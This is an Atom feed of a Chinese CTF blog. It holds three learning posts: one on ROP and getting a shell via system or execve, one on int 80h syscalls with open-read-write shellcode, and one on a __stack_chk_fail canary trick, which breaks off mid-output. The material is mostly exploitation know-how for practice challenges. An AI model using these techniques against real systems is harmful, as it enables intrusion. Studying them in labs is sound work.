<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Poker&#39;s Blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://0xpoker.cuit.site/"/>
  <updated>2017-12-07T07:25:27.862Z</updated>
  <id>http://0xpoker.cuit.site/</id>
  
  <author>
    <name>Poker</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>ROP学习之旅(一)</title>
    <link href="http://0xpoker.cuit.site/20171206/ROP%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85(%E4%B8%80)/"/>
    <id>http://0xpoker.cuit.site/20171206/ROP学习之旅(一)/</id>
    <published>2017-12-06T14:08:01.000Z</published>
    <updated>2017-12-07T07:25:27.862Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ROP学习之旅-一"><a href="#ROP学习之旅-一" class="headerlink" title="ROP学习之旅(一)"></a>ROP学习之旅(一)</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这块我还没学完，所以我只能先懂多少写多少…………………………….</p><h2 id="ROP相关原理"><a href="#ROP相关原理" class="headerlink" title="ROP相关原理"></a>ROP相关原理</h2><p>随着 <strong>NX</strong> 技术的产生，我们溢出的时候没法写 <strong>shellcode并执行</strong> 它了，那么就产生了一种名叫 <strong>ROP</strong> 的技术来绕过保护。<br><em>ROP</em> ，全称为： <strong>Return Oriented Programming</strong> ，是一种 <strong>面向返回的攻击技术</strong> ，又被称为 <strong>最有效最直接的攻击手法</strong> 。</p><h2 id="相关操作介绍"><a href="#相关操作介绍" class="headerlink" title="相关操作介绍"></a>相关操作介绍</h2><h3 id="检查文件是否满足条件"><a href="#检查文件是否满足条件" class="headerlink" title="检查文件是否满足条件"></a>检查文件是否满足条件</h3><p>首先，还是需要 <strong>pwntools</strong> 的一个功能 <strong>checksec</strong> ，先对文件的防护进行检查，或者使用python库的 <code>ELF(&quot;./XXXXXXX&quot;)</code> 来对文件的保护措施进行检查。检查形如：<br><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">➜  $ checksec XXXXXXXXXXX</span><br><span class="line"><span class="symbol">    Arch:</span>     i386-<span class="number">32</span>-little</span><br><span class="line"><span class="symbol">    RELRO:</span>    Partial RELRO</span><br><span class="line"><span class="symbol">    Stack:</span>    No canary found</span><br><span class="line"><span class="symbol">    NX:</span>       NX enabled</span><br><span class="line"><span class="symbol">    PIE:</span>      No PIE (<span class="number">0x8048000</span>)</span><br></pre></td></tr></table></figure></p><p>我们可以看出，该文件是 <strong>32位</strong> 程序，并且 <strong>开启了栈不可执行</strong> 保护，但是其他都没开，我们先不去管其他的保护措施。<br>如果题目提供了文件的话，我们可以把文件拖进IDA，然后一顿暴打…………..走偏了，我们把文件放进 <strong>IDA</strong> ，然后查看相关的函数地址，或者我们需要的操作地址。<br>然后最重要的是我们要查看是不是可以通过接收输入的函数进行溢出，如果可以，那就看输入缓冲区的大小然后再加上 <strong>pwntools</strong> 里的<code>p32/p64(address)</code>然后最后接收完输入后，你输入的前面那一堆都不起作用，最重要是后面的地址，覆盖了原来的返回地址，所以现在 <strong>函数返回就会跳到你给的那个地址开始执行指令</strong> 。如：<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [sp+1Ch] [bp-64h]@1</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(_bss_start, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"There is something amazing here, do you know anything?"</span>);</span><br><span class="line">  gets((<span class="keyword">char</span> *)&amp;v4);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Maybe I will tell you next time !"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><blockquote><p>这上面的代码就有很明显的gets函数可以溢出的漏洞。</p></blockquote><h3 id="PWN之ROPgadget"><a href="#PWN之ROPgadget" class="headerlink" title="PWN之ROPgadget"></a>PWN之ROPgadget</h3><p><strong>这个工具主要是用来寻找能够组成ROP链的小部分代码块。</strong><br><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ ROPgadget --<span class="keyword">binary </span>XXXXXX --only <span class="string">'int'</span></span><br><span class="line"><span class="symbol">Gadgets</span> information</span><br><span class="line">============================================================</span><br><span class="line"><span class="number">0x08049421</span> : int <span class="number">0x80</span></span><br><span class="line"><span class="number">0x080938fe</span> : int <span class="number">0xbb</span></span><br><span class="line"><span class="number">0x080869b5</span> : int <span class="number">0xf6</span></span><br><span class="line"><span class="number">0x0807b4d4</span> : int <span class="number">0xfc</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">Unique</span> gadgets found: <span class="number">4</span></span><br></pre></td></tr></table></figure></p><p>通过一小块一小块的代码，组成一个链最终就形成了ROP链。</p><blockquote><p>但是需要注意的是32位的系统和64位的系统传递参数的方式不同，所以溢出的时候也是一个要注意的点。</p></blockquote><p><em>例如，我们可以通过一个ROP链然后调用int 80h就是system call来实现getshell。也可以通过 ROPgadget里面的pop将我们在栈上放置好的参数依次出栈到相关的寄存器，然后调用相关的call达到效果。</em></p><h3 id="32位系统和64位系统传递参数的区别"><a href="#32位系统和64位系统传递参数的区别" class="headerlink" title="32位系统和64位系统传递参数的区别"></a>32位系统和64位系统传递参数的区别</h3><p>32位系统一般都是 <strong>eax</strong> 接收返回值，然后 <strong>eax接收系统调用号</strong> 这些，然后通过 <strong>栈传递参数</strong> ，如：<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br></pre></td></tr></table></figure></p><p>在汇编指令中， <strong>入栈的顺序是从右向左依次入栈</strong> ，遵循栈的先进后出原则。<br>而， <strong>64位系统一般都是前六个参数放在寄存器中，从第七个参数开始才在栈上出现。</strong><br><em>前6个参数的顺序是：</em> <strong>RDI，RSI，RDX，RCX，R8，R9</strong> </p><h2 id="shell获取小结"><a href="#shell获取小结" class="headerlink" title="shell获取小结"></a>shell获取小结</h2><ul><li>执行shellcode，这一方面也会有不同的情况</li><li>可以直接返回shell</li><li>可以将shell返回到某一个端口</li><li>shellcode中字符有时候需要满足不同的需求</li><li>注意， <strong>我们需要将shellcode写在可以执行的内存区域中。</strong></li><li>执行<code>system(“/bin/sh”)</code> , <code>system(&quot;sh&quot;)</code>等等</li><li>关于<code>system</code>的地址，参见下面章节的地址寻找。</li><li>关于<code>/bin/sh</code>， <code>sh</code><ul><li>首先寻找binary里面有没有对应的字符串,比如说有flush函数，那就一定有sh了</li><li>考虑个人读取对应字符串</li><li><strong>libc中其实是有/bin/sh的</strong></li></ul></li><li>优点<ul><li><strong>只需要一个参数。</strong></li></ul></li><li>缺点<ul><li><strong>有可能因为破坏环境变量而无法执行。</strong></li></ul></li><li>执行<code>execve(“/bin/sh”,NULL,NULL)</code></li><li>前几条同<code>system</code></li><li>优点<ul><li>几乎不受环境变量的影响。</li></ul></li><li>缺点<ul><li>需要3个参数。</li></ul></li><li>系统调用</li><li>系统调用号 <strong>11</strong><blockquote><p>用这些自己构建ROP链的时候可以参考int 80h的system call相关的参数知识</p></blockquote></li></ul><h2 id="地址寻找小结"><a href="#地址寻找小结" class="headerlink" title="地址寻找小结"></a>地址寻找小结</h2><h3 id="通用寻找"><a href="#通用寻找" class="headerlink" title="通用寻找"></a>通用寻找</h3><h4 id="直接地址寻找"><a href="#直接地址寻找" class="headerlink" title="直接地址寻找"></a>直接地址寻找</h4><p>程序中已经给出了相关变量或者函数的地址了。这时候，我们就可以直接进行利用了。</p><h4 id="got表寻找"><a href="#got表寻找" class="headerlink" title="got表寻找"></a>got表寻找</h4><p>有时候我们并不一定非得直接知道某个函数的地址，可以利用GOT表的跳转到对应函数的地址。当然，如果我们非得知道这个函数的地址，我们可以利用write，puts等输出函数将GOT表中地址处对应的内容输出出来 ( <strong>前提是这个函数已经被解析一次了</strong> ) 。</p><h3 id="有libc"><a href="#有libc" class="headerlink" title="有libc"></a>有libc</h3><p><strong>相对偏移寻找</strong> ，这时候我们就需要考虑利用libc中函数的基地址一样这个特性来寻找了。其实__libc_start_main就是libc在内存中的基地址。 <strong>注意：不要选择有wapper的函数，这样会使得函数的基地址计算不正确。</strong> 常见的有wapper的函数有………………………………………..(待补充)。</p><h3 id="无libc"><a href="#无libc" class="headerlink" title="无libc"></a>无libc</h3><p>其实，这种情况的解决策略分为两种</p><ul><li>想办法获取libc</li><li>想办法直接获取对应的地址。<br>而对于想要泄露的地址，我们只是单纯地需要其对应的内容，所以puts和write均可以。</li><li>puts会有\x00截断的问题</li><li>write可以指定长度输出的内容。<br>下面是一些相应的方法</li></ul><h4 id="DynELF"><a href="#DynELF" class="headerlink" title="DynELF"></a>DynELF</h4><p>前提是我们可以泄露任意地址的内容。</p><ul><li><strong>如果要使用write函数泄露的话，一次最好多输出一些地址的内容，因为我们一般是只是不断地向高地址读内容，很有可能导致高地址的环境变量被覆盖，就会导致shell不能启动。</strong></li></ul><h4 id="libc数据库"><a href="#libc数据库" class="headerlink" title="libc数据库"></a>libc数据库</h4><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">## 更新数据库</span><br><span class="line">./<span class="meta">get</span></span><br><span class="line">## 将已有libc添加到数据库中</span><br><span class="line">./<span class="keyword">add </span>libc.so</span><br><span class="line">## Find all the libc<span class="string">'s in the database that have the given names at the given addresses.</span></span><br><span class="line"><span class="string">./find function1 addr function2 addr</span></span><br><span class="line"><span class="string">## Dump some useful offsets, given a libc ID. You can also provide your own names to dump.</span></span><br><span class="line"><span class="string">./Dump some useful offsets</span></span><br></pre></td></tr></table></figure><p>去libc的数据库中找到对应的和已经出现的地址一样的libc，这时候很有可能是一样的。</p><ul><li>libcdb.com  </li></ul><p>当然，还有上面提到的<a href="https://github.com/lieanu/LibcSearcher。" target="_blank" rel="noopener">https://github.com/lieanu/LibcSearcher。</a></p><h4 id="ret2dl-resolve"><a href="#ret2dl-resolve" class="headerlink" title="ret2dl-resolve"></a>ret2dl-resolve</h4><p>当ELF文件采用动态链接时，got表会采用延迟绑定技术。当第一次调用某个libc函数时，程序会调用_dl_runtime_resolve函数对其地址解析。因此，我们可以利用栈溢出构造ROP链，伪造对其他函数(如：system)解析。这也是我们在高级rop中会介绍的技巧。</p>]]></content>
    
    <summary type="html">
    
      唉，昨晚忙着准备做题去了，没来写笔记，感觉这一周我天天都在考试，可是下星期还得考试，不过，在闲暇时间，还是看了下ROP的相关操作，我就简单记录下吧........................
    
    </summary>
    
      <category term="漏洞" scheme="http://0xpoker.cuit.site/categories/%E6%BC%8F%E6%B4%9E/"/>
    
      <category term="返回编程" scheme="http://0xpoker.cuit.site/categories/%E6%BC%8F%E6%B4%9E/%E8%BF%94%E5%9B%9E%E7%BC%96%E7%A8%8B/"/>
    
    
      <category term="漏洞" scheme="http://0xpoker.cuit.site/tags/%E6%BC%8F%E6%B4%9E/"/>
    
      <category term="ROP链" scheme="http://0xpoker.cuit.site/tags/ROP%E9%93%BE/"/>
    
  </entry>
  
  <entry>
    <title>Linux系统下的int 80h系统调用</title>
    <link href="http://0xpoker.cuit.site/20171204/Linux%E7%B3%BB%E7%BB%9F%E4%B8%8B%E7%9A%84int-80h%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8/"/>
    <id>http://0xpoker.cuit.site/20171204/Linux系统下的int-80h系统调用/</id>
    <published>2017-12-04T13:11:00.000Z</published>
    <updated>2017-12-05T06:14:32.501Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Linux系统下的int-80h系统调用"><a href="#Linux系统下的int-80h系统调用" class="headerlink" title="Linux系统下的int-80h系统调用"></a>Linux系统下的int-80h系统调用</h1><h2 id="系统调用"><a href="#系统调用" class="headerlink" title="系统调用"></a>系统调用</h2><p>系统调用又称： <strong>system call</strong> ，又称为系统呼叫，指运行 <strong>在使用者空间</strong>的程序向 <strong>操作系统内核</strong> 请求 <strong>需要更高权限运行</strong> 的服务。 系统调用提供了用户程序与操作系统之间的接口。 <strong>大多数系统交互式操作需求在内核态</strong> 执行。<em>如：设备IO操作或者进程间通信。</em><br>Linux的系统调用通过<code>int 80h</code>实现，用 <strong>系统调用号</strong> 来区分 <strong>入口函数</strong> 。</p><h3 id="操作系统实现系统调用的基本过程"><a href="#操作系统实现系统调用的基本过程" class="headerlink" title="操作系统实现系统调用的基本过程"></a>操作系统实现系统调用的基本过程</h3><ol><li>应用程序调用 <strong>库函数(API)</strong>；</li><li><strong>API</strong> 将 <strong>系统调用号</strong> 存入 <strong>EAX</strong>  ，然后通过 <strong>中断调用</strong> 使系统进入 <em>内核态</em> ；</li><li>内核中的 <strong>中断处理函数</strong> 根据 <strong>系统调用号</strong> ，调用对应的 <strong>内核函数(系统调用)</strong>；</li><li>系统调用完成相应功能，将 <strong>返回值存入EAX</strong> ， <em>返回到中断处理函数</em> ；</li><li><strong>中断处理函数返回到API中</strong> ；</li><li>API将 <strong>EAX</strong> 返回给应用程序。</li></ol><h2 id="系统调用表"><a href="#系统调用表" class="headerlink" title="系统调用表"></a>系统调用表</h2><p>先给一段示例吧，摘自pwnable.tw的orw题，这道题需要自己写shellcode然后调用他获得flag文件中的flag。</p><h3 id="调用示例"><a href="#调用示例" class="headerlink" title="调用示例"></a>调用示例</h3><p>代码如下：<br><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">global</span> _start</span><br><span class="line"> </span><br><span class="line">[SECTION <span class="meta">.text</span>]</span><br><span class="line"> </span><br><span class="line"><span class="symbol">_start</span>:</span><br><span class="line">  jmp MESSAGE</span><br><span class="line"> </span><br><span class="line"><span class="symbol">GOBACK</span>:</span><br><span class="line">  xor eax, eax</span><br><span class="line">  xor ebx, ebx</span><br><span class="line">  xor ecx, ecx</span><br><span class="line">  xor edx, edx</span><br><span class="line">  xor esi, esi</span><br><span class="line">  xor edi, edi</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">mov </span>eax, <span class="number">5</span>  <span class="comment">;open file</span></span><br><span class="line">  <span class="keyword">pop </span>ebx</span><br><span class="line">  int <span class="number">0x80</span></span><br><span class="line"> </span><br><span class="line">  <span class="keyword">mov </span>ebx, eax</span><br><span class="line"> </span><br><span class="line">  xor eax, eax</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">mov </span>eax, <span class="number">3</span>  <span class="comment">;read from file</span></span><br><span class="line">  <span class="keyword">mov </span>ecx, esp</span><br><span class="line">  <span class="keyword">mov </span>edx, <span class="number">100</span> <span class="comment">;count</span></span><br><span class="line">  int <span class="number">0x80</span></span><br><span class="line"> </span><br><span class="line">  <span class="keyword">mov </span>eax, <span class="number">4</span>  <span class="comment">;write</span></span><br><span class="line">  <span class="keyword">mov </span>ebx, <span class="number">1</span></span><br><span class="line">  <span class="keyword">mov </span>ecx, esp</span><br><span class="line">  <span class="keyword">mov </span>edx, <span class="number">100</span> <span class="comment">;count</span></span><br><span class="line">  int <span class="number">0x80</span></span><br><span class="line"> </span><br><span class="line">  <span class="keyword">mov </span>eax, <span class="number">1</span> <span class="comment">;exit</span></span><br><span class="line">  int <span class="number">0x80</span></span><br><span class="line"> </span><br><span class="line"><span class="symbol">MESSAGE</span>:</span><br><span class="line">  call GOBACK</span><br><span class="line"> </span><br><span class="line">  db <span class="string">'/home/orw/flag'</span></span><br></pre></td></tr></table></figure></p><h3 id="调用列表"><a href="#调用列表" class="headerlink" title="调用列表"></a>调用列表</h3><p>相关调用有点多，我就不一一列举了，给个博客连接吧。<br><a href="http://blog.csdn.net/xiaominthere/article/details/17287965" title="Linux系统调用 int 80h" target="_blank" rel="noopener">Linux系统调用 int 80h</a><br><a href="https://www.baidu.com/s?wd=linux%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E8%A1%A8&amp;ie=UTF-8" title="百度——Linux系统调用表" target="_blank" rel="noopener">百度——Linux系统调用表</a></p>]]></content>
    
    <summary type="html">
    
      最近临近考试月，超级忙，所以昨天没更新文章，但是昨天还是看了一下东西的，我慢慢总结出来吧，先写我看到的使用int 80h来直接进行系统调用的说明吧。
    
    </summary>
    
      <category term="漏洞" scheme="http://0xpoker.cuit.site/categories/%E6%BC%8F%E6%B4%9E/"/>
    
      <category term="shellcode" scheme="http://0xpoker.cuit.site/categories/%E6%BC%8F%E6%B4%9E/shellcode/"/>
    
      <category term="汇编指令" scheme="http://0xpoker.cuit.site/categories/%E6%BC%8F%E6%B4%9E/shellcode/%E6%B1%87%E7%BC%96%E6%8C%87%E4%BB%A4/"/>
    
    
      <category term="shellcode编写" scheme="http://0xpoker.cuit.site/tags/shellcode%E7%BC%96%E5%86%99/"/>
    
      <category term="系统调用" scheme="http://0xpoker.cuit.site/tags/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8/"/>
    
      <category term="汇编指令" scheme="http://0xpoker.cuit.site/tags/%E6%B1%87%E7%BC%96%E6%8C%87%E4%BB%A4/"/>
    
  </entry>
  
  <entry>
    <title>一点关于利用__stack_chk_fail绕过canary的方法</title>
    <link href="http://0xpoker.cuit.site/20171202/%E4%B8%80%E7%82%B9%E5%85%B3%E4%BA%8E%E5%88%A9%E7%94%A8__stack_chk_fail%E7%BB%95%E8%BF%87canary%E7%9A%84%E6%96%B9%E6%B3%95/"/>
    <id>http://0xpoker.cuit.site/20171202/一点关于利用__stack_chk_fail绕过canary的方法/</id>
    <published>2017-12-02T14:26:31.000Z</published>
    <updated>2017-12-03T07:16:52.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="一点关于利用-stack-chk-fail绕过canary的方法"><a href="#一点关于利用-stack-chk-fail绕过canary的方法" class="headerlink" title="一点关于利用__stack_chk_fail绕过canary的方法"></a>一点关于利用__stack_chk_fail绕过canary的方法</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>原本可能还不会这么早接触到这些绕过技巧，可是今天闲了一会儿，就去看PWN题的writeup，就看到了我接下来要写的这些内容，感觉并不难理解，就是有一块ELF的映射方式没看懂，为啥会映射两次。</p><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>首先我们得明白 <strong>canary</strong> 保护的大概原理是什么，就是一个 <strong>标志</strong> ，如果 <strong>覆盖了那个标志 </strong>，在函数退出时检查 <strong>canary</strong> ，发现 <strong>canary</strong> 被修改，函数 <strong>不能安全返回</strong> ， <strong>call</strong> 到 <strong>__stack_chk_fail</strong> 打印<code>argv[0]</code>这个 <strong>指针指向的字符串</strong> ， <strong>默认是程序的名字</strong><br>而 <strong>__stack_chk_fail</strong> 会调用 <strong>__libc_message</strong> 从而打印出我们需要的 <strong>flag</strong> </p><h2 id="相关的操作"><a href="#相关的操作" class="headerlink" title="相关的操作"></a>相关的操作</h2><blockquote><p>题目是jarvis oj的pwn，名叫</p></blockquote><p>首先将下载到的文件放进IDA看一眼找到如下的函数<br><img src="http://p1.bqimg.com/567571/e7d259807dcaf96f.png" alt="函数图" title="文件的函数详情"><br>其实从这里我们就不难看出_IO_getc函数存在溢出漏洞，那么接下来想的就是用checksec这个东西查看下文件开启了哪些保护，想想我们该怎么去绕过。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ checksec </span><br><span class="line">CANARY    : ENABLED</span><br><span class="line">FORTIFY   : ENABLED</span><br><span class="line">NX        : ENABLED</span><br><span class="line">PIE       : disabled</span><br><span class="line">RELRO     : disabled</span><br></pre></td></tr></table></figure></p><blockquote><p><strong>checksec这个东西在pwntools里有，gdb-peda里也有</strong></p></blockquote><p>那么我们把文件放到linux虚拟机上用gdb调试下试试吧。可以看到是这样的：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ b *0x0040080e</span><br><span class="line">Breakpoint 1 at 0x40080e</span><br><span class="line">gdb-peda$ r</span><br><span class="line">Starting program: /home/longlong/Desktop/smashes </span><br><span class="line">Hello!</span><br><span class="line">What&apos;s your name? [----------------------------------registers-----------------------------------]</span><br><span class="line">RAX: 0x19 </span><br><span class="line">RBX: 0x0 </span><br><span class="line">RCX: 0x7ffff7b00710 (&lt;__write_nocancel+7&gt;:    cmp    rax,0xfffffffffffff001)</span><br><span class="line">RDX: 0x19 </span><br><span class="line">RSI: 0x7ffff7dd59e0 --&gt; 0x0 </span><br><span class="line">RDI: 0x7fffffffdcb0 --&gt; 0x7ffff7a25078 --&gt; 0xc001200003322 </span><br><span class="line">RBP: 0x0 </span><br><span class="line">RSP: 0x7fffffffdcb0 --&gt; 0x7ffff7a25078 --&gt; 0xc001200003322 </span><br><span class="line">RIP: 0x40080e (call   0x4006c0 &lt;_IO_gets@plt&gt;)</span><br><span class="line">R8 : 0x7ffff7fdb740 (0x00007ffff7fdb740)</span><br><span class="line">R9 : 0x400934 (&quot;Hello!\nWhat&apos;s your name? &quot;)</span><br><span class="line">R10: 0x7ffff7fdb740 (0x00007ffff7fdb740)</span><br><span class="line">R11: 0x246 </span><br><span class="line">R12: 0x4006ee (xor    ebp,ebp)</span><br><span class="line">R13: 0x7fffffffdec0 --&gt; 0x1 </span><br><span class="line">R14: 0x0 </span><br><span class="line">R15: 0x0</span><br><span class="line">EFLAGS: 0x206 (carry PARITY adjust zero sign trap INTERRUPT direction overflow)</span><br><span class="line">[-------------------------------------code-------------------------------------]</span><br><span class="line">   0x400804:    xor    eax,eax</span><br><span class="line">   0x400806:    call   0x4006b0 &lt;__printf_chk@plt&gt;</span><br><span class="line">   0x40080b:    mov    rdi,rsp</span><br><span class="line">=&gt; 0x40080e:    call   0x4006c0 &lt;_IO_gets@plt&gt;</span><br><span class="line">   0x400813:    test   rax,rax</span><br><span class="line">   0x400816:    je     0x40089f</span><br><span class="line">   0x40081c:    mov    rdx,rsp</span><br><span class="line">   0x40081f:    mov    esi,0x400960</span><br><span class="line">Guessed arguments:</span><br><span class="line">arg[0]: 0x7fffffffdcb0 --&gt; 0x7ffff7a25078 --&gt; 0xc001200003322 </span><br><span class="line">[------------------------------------stack-------------------------------------]</span><br><span class="line">0000| 0x7fffffffdcb0 --&gt; 0x7ffff7a25078 --&gt; 0xc001200003322 </span><br><span class="line">0008| 0x7fffffffdcb8 --&gt; 0x7ffff7ff74c0 --&gt; 0x7ffff7a15000 --&gt; 0x10102464c457f </span><br><span class="line">0016| 0x7fffffffdcc0 --&gt; 0x7fffffffde10 --&gt; 0x0 </span><br><span class="line">0024| 0x7fffffffdcc8 --&gt; 0x7ffff7ff7a10 --&gt; 0x400458 (&quot;GLIBC_2.2.5&quot;)</span><br><span class="line">0032| 0x7fffffffdcd0 --&gt; 0x1 </span><br><span class="line">0040| 0x7fffffffdcd8 --&gt; 0x7ffff7ffe520 --&gt; 0x7ffff7ffe480 --&gt; 0x7ffff7ff79c8 --&gt; 0x7ffff7ffe1c8 --&gt; 0x0 </span><br><span class="line">0048| 0x7fffffffdce0 --&gt; 0x7ffff7ffe1c8 --&gt; 0x0 </span><br><span class="line">0056| 0x7fffffffdce8 --&gt; 0x7ffff7de4961 (&lt;_dl_lookup_symbol_x+305&gt;:    cmp    eax,0x0)</span><br><span class="line">[------------------------------------------------------------------------------]</span><br><span class="line">Legend: code, data, rodata, value</span><br><span class="line"></span><br><span class="line">Breakpoint 1, 0x000000000040080e in ?? ()</span><br><span class="line">gdb-peda$ find /home</span><br><span class="line">Searching for &apos;/home&apos; in: None ranges</span><br><span class="line">Found 8 results, display max 8 items:</span><br><span class="line">[stack] : 0x7fffffffe253 (&quot;/home/longlong/Desktop/smashes&quot;)</span><br><span class="line">[stack] : 0x7fffffffeafc (&quot;/home/longlong/.virtualenvs&quot;)</span><br><span class="line">[stack] : 0x7fffffffeb69 (&quot;/home/longlong/Devel&quot;)</span><br><span class="line">[stack] : 0x7fffffffec50 (&quot;/home/longlong/.virtualenvs&quot;)</span><br><span class="line">[stack] : 0x7fffffffec70 (&quot;/home/longlong/Desktop&quot;)</span><br><span class="line">[stack] : 0x7fffffffed82 (&quot;/home/longlong&quot;)</span><br><span class="line">[stack] : 0x7fffffffefa5 (&quot;/home/longlong/.Xauthority&quot;)</span><br><span class="line">[stack] : 0x7fffffffefd9 (&quot;/home/longlong/Desktop/smashes&quot;)</span><br><span class="line">gdb-peda$ find 0x7fffffffe253</span><br><span class="line">Searching for &apos;0x7fffffffe253&apos; in: None ranges</span><br><span class="line">Found 2 results, display max 2 items:</span><br><span class="line">   libc : 0x7ffff7dd4018 --&gt; 0x7fffffffe253 (&quot;/home/longlong/Desktop/smashes&quot;)</span><br><span class="line">[stack] : 0x7fffffffdec8 --&gt; 0x7fffffffe253 (&quot;/home/longlong/Desktop/smashes&quot;) </span><br><span class="line">gdb-peda$ distance $rsp 0x7fffffffdec8</span><br><span class="line">From 0x7fffffffdcb0 to 0x7fffffffdec8: 536 bytes, 134 dwords</span><br></pre></td></tr></table></figure></p><blockquote><p><strong>这里的536字节就是0x218字节</strong></p></blockquote><p>所以，我们通过用 <strong>gdb</strong> 的计算，知道了<code>argv[0]</code>的地址到缓冲区开始的地址一共有 <strong>0x218</strong> 字节那么长。<br>通过查找与flag拥有相似内容的方法知道了，在制度存储器另一个位置还保存着flag，那么原来的flag因为失败被清除了，我们就让指针指向这个地方好了。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ find PCTF</span><br><span class="line">Searching for &apos;PCTF&apos; in: None ranges</span><br><span class="line">Found 2 results, display max 2 items:</span><br><span class="line">smashes : 0x400d20 (&quot;PCTF&#123;Here&apos;s the flag on server&#125;&quot;)</span><br><span class="line">smashes 